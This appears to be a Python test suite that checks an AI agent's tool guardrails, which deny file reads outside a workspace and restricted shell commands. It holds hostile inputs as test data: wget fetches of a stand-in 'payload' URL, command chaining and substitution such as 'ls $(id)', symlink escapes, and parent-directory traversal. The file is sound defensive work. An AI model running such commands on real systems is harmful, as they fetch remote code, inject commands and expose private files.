import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT / "agent"))
os.environ["AGENT_MODE"] = "protected"

import agent


class ProtectedToolGuardrailTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.temp = tempfile.TemporaryDirectory(prefix="agent-guardrail-tests-")
        cls.root = Path(cls.temp.name)
        cls.workspace = cls.root / "workspace"
        cls.fixtures = cls.workspace / "fixtures"
        cls.private = cls.workspace / "private"
        cls.fixtures.mkdir(parents=True)
        cls.private.mkdir()
        (cls.fixtures / "safe.txt").write_text("SAFE_FIXTURE_CONTENT\n")
        (cls.private / "shadow.txt").write_text("SYNTHETIC_SECRET\n")
        cls.outside = cls.root / "outside.txt"
        cls.outside.write_text("OUTSIDE_WORKSPACE\n")
        (cls.fixtures / "escape-link.txt").symlink_to(cls.outside)

        agent.WORKSPACE_ROOT = str(cls.workspace)
        agent.FIXTURE_ROOT = str(cls.fixtures)

    @classmethod
    def tearDownClass(cls):
        cls.temp.cleanup()

    def test_reads_approved_fixture(self):
        result = agent.execute_tool(
            "read_file", {"path": str(self.fixtures / "safe.txt")}
        )
        self.assertTrue(result["success"])
        self.assertEqual(result["content"], "SAFE_FIXTURE_CONTENT\n")

    def test_denies_external_path(self):
        with self.assertRaises(agent.GuardrailDenied):
            agent.execute_tool("read_file", {"path": "/etc/hostname"})

    def test_denies_private_workspace_file(self):
        with self.assertRaises(agent.GuardrailDenied):
            agent.execute_tool(
                "read_file", {"path": str(self.private / "shadow.txt")}
            )

    def test_denies_symlink_escape(self):
        with self.assertRaises(agent.GuardrailDenied):
            agent.execute_tool(
                "read_file", {"path": str(self.fixtures / "escape-link.txt")}
            )

    def test_denies_parent_traversal(self):
        with self.assertRaises(agent.GuardrailDenied):
            agent.execute_tool(
                "read_file",
                {"path": str(self.fixtures / "../private/shadow.txt")},
            )

    def test_denies_symlink_to_another_fixture(self):
        link = self.fixtures / "internal-link.txt"
        link.symlink_to(self.fixtures / "safe.txt")
        with self.assertRaises(agent.GuardrailDenied):
            agent.execute_tool("read_file", {"path": str(link)})

    def test_denies_symlinked_directory(self):
        link = self.fixtures / "private-link"
        link.symlink_to(self.private, target_is_directory=True)
        with self.assertRaises(agent.GuardrailDenied):
            agent.execute_tool(
                "read_file",
                {"path": str(link / "shadow.txt")}
            )

    def test_protected_audit_failure_stops_execution(self):
        with patch("builtins.open", side_effect=OSError("simulated disk failure")):
            with self.assertRaisesRegex(
                RuntimeError, "audit persistence failed"
            ):
                agent.audit("audit_failure_probe")

    def test_denies_fifo_without_blocking(self):
        fifo = self.fixtures / "named-pipe"
        os.mkfifo(fifo)
        with self.assertRaises(agent.GuardrailDenied):
            agent.execute_tool("read_file", {"path": str(fifo)})

    def test_allows_pwd(self):
        result = agent.execute_tool("shell_execute", {"command": "pwd"})
        self.assertTrue(result["success"])
        self.assertEqual(result["stdout"], str(self.workspace) + "\n")

    def test_allows_fixture_listing(self):
        result = agent.execute_tool("shell_execute", {"command": "ls"})
        self.assertTrue(result["success"])
        self.assertIn("safe.txt", result["stdout"])
        self.assertNotIn("shadow.txt", result["stdout"])

    def test_denies_touch(self):
        marker = self.workspace / "output" / "GUARDRAIL_MARKER"
        with self.assertRaises(agent.GuardrailDenied):
            agent.execute_tool(
                "shell_execute", {"command": f"touch {marker}"}
            )
        self.assertFalse(marker.exists())

    def test_denies_wget_and_busybox_wget(self):
        commands = (
            "wget https://example.invalid/payload",
            "busybox wget https://example.invalid/payload",
            "/bin/busybox wget https://example.invalid/payload",
        )

        for command in commands:
            with self.subTest(command=command):
                with self.assertRaises(agent.GuardrailDenied):
                    agent.execute_tool(
                        "shell_execute", {"command": command}
                    )

    def test_denies_shell_chaining_and_substitution(self):
        for command in ("ls; id", "ls $(id)", "ls > /tmp/listing", "ls\nid"):
            with self.subTest(command=command):
                with self.assertRaises(agent.GuardrailDenied):
                    agent.execute_tool("shell_execute", {"command": command})

    def test_denial_is_written_to_audit_log(self):
        audit_path = self.root / "guardrail-audit.jsonl"
        agent.AUDIT_LOG = str(audit_path)
        responses = [
            {
                "role": "assistant",
                "content": "",
                "tool_calls": [{
                    "function": {
                        "name": "shell_execute",
                        "arguments": {"command": "touch /tmp/SHOULD_NOT_EXIST"},
                    }
                }],
            },
            {
                "role": "assistant",
                "content": "The command was denied.",
                "tool_calls": [],
            },
        ]
        with patch.object(agent, "call_ollama", side_effect=responses):
            agent.ask_agent("Attempt the prohibited touch command.")

        records = [
            json.loads(line)
            for line in audit_path.read_text(encoding="utf-8").splitlines()
        ]
        self.assertTrue(any(r.get("event") == "guardrail_denied" for r in records))
        self.assertTrue(any(
            r.get("event") == "tool_completed" and r.get("status") == "denied"
            for r in records
        ))


if __name__ == "__main__":
    unittest.main(verbosity=2)
